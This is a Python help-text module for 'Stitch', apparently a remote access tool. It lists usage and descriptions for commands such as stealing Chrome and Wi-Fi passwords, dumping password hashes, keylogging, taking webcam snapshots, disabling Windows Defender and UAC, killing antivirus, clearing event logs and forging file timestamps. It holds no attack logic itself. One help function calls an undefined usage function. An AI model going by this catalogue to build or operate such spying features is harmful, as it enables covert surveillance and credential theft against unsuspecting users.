#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_utils import st_print

################################################################################
#                        Start of USAGE Section                                #
################################################################################

def usage_addkey(): st_print('[*] Usage: addkey [encrypted AES key]\n')

def usage_askpassword(): st_print('[*] Usage: askPassword\n')

def usage_avscan(): st_print('[*] Usage: avscan\n')

def usage_cat(): st_print('[*] Usage: cat [path]\n')

def usage_cd(): st_print('[*] Usage: cd [path]\n')

def usage_chromedump(): st_print('[*] Usage: chromedump\n')

def usage_cls(): st_print('[*] Usage: cls\n')

def usage_clear(): st_print('[*] Usage: clear\n')

def usage_clearev(): st_print('[*] Usage: clearev\n')

def usage_connect(): st_print("[*] Usage: connect [target] [port]\n")

def usage_crackpassword(): st_print('[*] Usage: crackpassword\n')

def usage_dir(): st_print('[*] Usage: dir\n')

def usage_disableRDP(): st_print('[*] Usage: disableRDP\n')

def usage_disableUAC(): st_print('[*] Usage: disableUAC\n')

def usage_disableWindef(): st_print('[*] Usage: disableWindef\n')

def usage_displayoff(): st_print('[*] Usage: displayoff\n')

def usage_displayon(): st_print('[*] Usage: displayon\n')

def usage_download(): st_print("[*] Usage: download [path]\n")

def usage_drives(): st_print('[*] Usage: drives\n')

def usage_editaccessed(): st_print('[*] Usage: editaccessed [path]\n')

def usage_editcreated(): st_print('[*] Usage: editcreated [path]\n')

def usage_editmodified(): st_print('[*] Usage: editmodified [path]\n')

def usage_enableRDP(): st_print('[*] Usage: enableRDP\n')

def usage_enableUAC(): st_print('[*] Usage: enableUAC\n')

def usage_enableWindef(): st_print('[*] Usage: enableWindef\n')

def usage_environment(): st_print('[*] Usage: environment\n')

def usage_fileinfo(): st_print('[*] Usage: fileinfo [path]\n')

def usage_firewall(): st_print('[*] Usage: firewall status\n[*] Usage: firewall [open/close] [port] [in/out] [tcp/udp]\n')

def usage_freeze(): st_print('[*] Usage: freeze [status/start/stop]\n')

def usage_hashdump(): st_print('[*] Usage: hashdump\n')

def usage_hide(): st_print('[*] Usage: hide [file/dir]\n')

def usage_history(): st_print('[*] Usage: history\n')

def usage_history_remove(): st_print('[*] Usage: history_remove [target]\n')

def usage_home(): st_print('[*] Usage: home\n')

def usage_hostsfile(): st_print('[*] Usage: hostsfile [update/remove/show]\n')

def usage_ifconfig(): st_print('[*] Usage: ifconfig\n')

def usage_ipconfig(): st_print('[*] Usage: ipconfig\n')

def usage_keylogger(): st_print('[*] Usage: keylogger [status/start/stop/dump]\n')

def usage_location(): st_print('[*] Usage: location\n')

def usage_lockscreen(): st_print('[*] Usage: lockscreen\n')

def usage_logintext(): st_print('[*] Usage: logintext\n')

def usage_lsmod(): st_print('[*] Usage: lsmod\n')

def usage_ls(): st_print('[*] Usage: ls\n')

def usage_listen(): st_print('[*] Usage: listen [port]\n')

def usage_more(): st_print('[*] Usage: more [path]\n')

def usage_popup(): st_print('[*] Usage: popup\n')

def usage_pwd(): st_print('[*] Usage: pwd\n')

def usage_ps(): st_print('[*] Usage: ps\n')

def usage_pyexec(): st_print("[*] Usage: pyexec [python script]\n")

def usage_scanreg(): st_print('[*] Usage: scanreg\n')

def usage_screenshot(): st_print('[*] Usage: screenshot\n')

def usage_sessions(): st_print('[*] Usage: sessions\n')

def usage_shell(): st_print('[*] Usage: shell [session]\n')

def usage_showkey(): st_print('[*] Usage: showkey\n')

def usage_ssh(): st_print('[*] Usage: ssh\n')

def usage_start(): st_print('[*] Usage: run [path]\n')

def usage_stitchgen(): st_print('[*] Usage: stitch_gen\n')

def usage_sudo(): st_print('[*] Usage: sudo [command]\n')

def usage_sysinfo(): st_print('[*] Usage: sysinfo\n')

def usage_touch(): st_print('[*] Usage: touch [path]\n')

def usage_unhide(): st_print('[*] Usage: unhide [file/dir]\n')

def usage_upload(): st_print("[*] Usage: upload [file/dir]\n")

def usage_vmscan(): st_print('[*] Usage: vmscan\n')

def usage_webcamsnap(): st_print('[*] Usage: webcamsnap [device]\n')

def usage_webcamlist(): st_print('[*] Usage: webcamlist\n')

def usage_wifikeys(): st_print("[*] Usage: wifikeys\n")

def usage_exit(): st_print('[*] Usage: exit\n')

################################################################################
#                        Start of HELP Section                                 #
################################################################################

def st_help_addkey():
    st_print("[*] Adds an AES key to the library; allowing communication with "\
             "Stitch payloads which use that encryption key.")
    usage_addkey()

def st_help_askpassword():
    st_print("[*] Displays security password prompt and returns user's input.")
    usage_askpassword()

def st_help_avscan():
    st_print('[*] Scans and lists possible Antiviruses installed.')
    usage_avscan()

def st_help_avkill():
    st_print('[*] Attempts to terminate detected Antiviruses running.')
    usage_avkill()

def st_help_cat():
    st_print('[*] Displays content of the file.')
    usage_cat()

def st_help_cd():
    st_print('[*] Displays the name of or changes the current directory.')
    usage_cd()

def st_help_chromedump():
    st_print('[*] Retrieves all passwords stored by Chrome.')
    usage_chromedump()

def st_help_cls():
    st_print('[*] Clears the screen.')
    usage_cls()

def st_help_clear():
    st_print('[*] Clears the screen.')
    usage_clear()

def st_help_clearev():
    st_print('[*] Clears System, Security, and Application event logs on a Windows machine.')
    usage_clearev()

def st_help_connect():
    st_print('[*] Attempts to connect to a server running a stitch payload.')
    usage_connect()

def st_help_crackpassword():
    st_print('[*] Attempts to crack the sudo password by using a dictionary attack.')
    usage_crackpassword()

def st_help_dir():
    st_print('[*] Displays a list of files and subdirectories in a directory.')
    usage_dir()

def st_help_disableRDP():
    st_print('[*] Disables Remote Desktop Protocol feature.')
    usage_disableRDP()

def st_help_disableUAC():
    st_print('[*] Disables the User Account Control feature.')
    usage_disableUAC()

def st_help_disableWindef():
    st_print('[*] Disables Windows Defender.')
    usage_disableWindef()

def st_help_displayoff():
    st_print("[*] Turns off the display monitors.")
    usage_displayoff()

def st_help_displayon():
    st_print("[*] Turns on the display monitors.")
    usage_displayon()

def st_help_download():
    st_print('[*] Downloads the specified file/dir to the Stitch Downloads folder.')
    usage_download()

def st_help_drives():
    st_print('[*] Displays info of all drives on the system.')
    usage_drives()

def st_help_editaccessed():
    st_print('[*] Edits the "Accessed" date of a file.')
    usage_editaccessed()

def st_help_editcreated():
    st_print('[*] Edits the "Created" date of a file')
    usage_editcreated()

def st_help_editmodified():
    st_print('[*] Edits the "Modified" date of a file.')
    usage_editmodified()

def st_help_enableRDP():
    st_print('[*] Enables Remote Desktop Protocol feature.')
    usage_enableRDP()

def st_help_enableUAC():
    st_print('[*] Enables the User Account Control feature.')
    usage_enableUAC()

def st_help_enableWindef():
    st_print('[*] Enables Windows Defender.')
    usage_enableWindef()

def st_help_environment():
    st_print("[*] Displays the system's environment variables.")
    usage_environment()

def st_help_fileinfo():
    st_print('[*] Disaplys file information.')
    usage_fileinfo()

def st_help_firewall():
    st_print('[*] Displays firewall status, open/close ports, or allow a program.')
    usage_firewall()

def st_help_freeze():
    st_print("[*] Freezes the mouse and keyboard of the system. Allowing you to start/stop and view the status.")
    usage_freeze()

def st_help_hashdump():
    st_print('[*] Grabs the password hashes stored on the system.')
    usage_hashdump()

def st_help_hide():
    st_print('[*] Hides the specified file/dir from the user.')
    usage_hide()

def st_help_history():
    st_print('[*] Displays information of past shell connections.')
    usage_history()

def st_help_history_remove():
    st_print('[*] Removes the system from your history.')
    usage_history_remove()

def st_help_home():
    st_print('[*] Clears the screen and displays the Stitch banner.')
    usage_home()

def st_help_hostsfile():
    st_print("[*] Updates, removes, or shows desired hostname and IP address from the system's hosts file.")
    usage_hostsfile()

def st_help_ifconfig():
    st_print("[*] Displays the system's IP configuration.")
    usage_ifconfig()

def st_help_ipconfig():
    st_print("[*] Displays the system's IP configuration.")
    usage_ipconfig()

def st_help_keylogger():
    st_print("[*] Records keystrokes of the user. Allowing you to view the status, start, stop, and dump the keystokes to screen.")
    usage_keylogger()

def st_help_location():
    st_print("[*] Gives public IP and estimate geo location of the system.")
    usage_location()

def st_help_lockscreen():
    st_print("[*] Enters the system's lock screen.")
    usage_lockscreen()

def st_help_logintext():
    st_print("[*] Sets the text of the system's login screen.")
    usage_logintext()

def st_help_ls():
    st_print('[*] Displays a list of files and subdirectories in a directory.')
    usage_ls()

def st_help_lsmod():
    st_print('[*] Displays list of all installed drivers.')
    usage_lsmod()

def st_help_listen():
    st_print('[*] Server binds to given port to listen for connections.')
    usage_listen()

def st_help_more():
    st_print('[*] Displays ouput of file path.')
    usage_more()

def st_help_popup():
    st_print("[*] Displays popup box with custom message.")
    usage_popup()

def st_help_pwd():
    st_print('[*] Displays the name of the current directory.')
    usage_pwd()

def st_help_pyexec():
    st_print('[*] Runs python script on the system.')
    usage_pyexec()

def st_help_ps():
    st_print('[*] Displays list of all running processes.')
    usage_ps()

def st_help_scanreg():
    st_print('[*] Display information on Windows Registry.')
    usage_scanreg()

def st_help_screenshot():
    st_print('[*] Takes a screenshot of the screen.')
    usage_screenshot()

def st_help_sessions():
    st_print('[*] Displays machines available for exploitation.')
    usage_sessions()

def st_help_shell():
    st_print('[*] Opens a shell prompt of the requested session.')
    usage_shell()

def st_help_showkey():
    st_print('[*] Displays the active encrypted AES key used for payload creation.')
    usage_showkey()

def st_help_ssh():
    st_print('[*] Attempts to open a ssh connection to the requested host.')
    usage_ssh()

def st_help_start():
    st_print('[*] Starts the desired file.')
    usage_start()

def st_help_stitchgen():
    st_print('[*] Generates stitch payloads based on running OS.')
    usage_stitchgen()

def st_help_sudo():
    st_print("[*] Runs the preceding command with admin priveleges.")
    usage_sudo()

def st_help_sysinfo():
    st_print('[*] Displays system information.')
    usage_sysinfo()

def st_help_touch():
    st_print('[*] Creates a file with no contents.')
    usage_touch()

def st_help_unhide():
    st_print('[*] Unhides the specified file/dir from the user.')
    usage_unhide()

def st_help_upload():
    st_print('[*] Uploads a file/dir to the system.')
    usage_upload()

def st_help_vmscan():
    st_print('[*] Detects if the system is a virtual machine.')
    usage_vmscan()

def st_help_webcamsnap():
    st_print('[*] Takes and downloads a picture using a connected webcamera.')
    usage_webcamsnap()

def st_help_webcamlist():
    st_print('[*] Displays list of connected webcameras.')
    usage_webcamlist()

def st_help_wifikeys():
    st_print('[*] Displays all saved wifi passwords on the system.')
    usage_wifikeys()

def st_help_exit():
    st_print('[*] Exits Stitch.')
    usage_exit()

def st_help_EOF():
    st_print('[*] Exits Stitch.')
    usage_exit()
